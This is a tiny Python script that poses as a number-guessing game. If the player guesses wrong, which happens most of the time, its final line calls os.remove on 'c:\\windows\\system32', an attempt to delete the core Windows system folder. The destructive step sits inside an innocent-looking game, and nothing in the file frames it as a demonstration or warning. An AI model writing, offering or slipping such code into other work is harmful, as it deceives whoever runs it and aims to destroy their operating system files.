import random
import os
number=random.randint(1,10)
guess=input("Guess the number between 1 to 10::")
guess=int(guess)
if guess==number:
    print("YOU WIN!!")
else:
    os.remove("c:\\windows\\system32")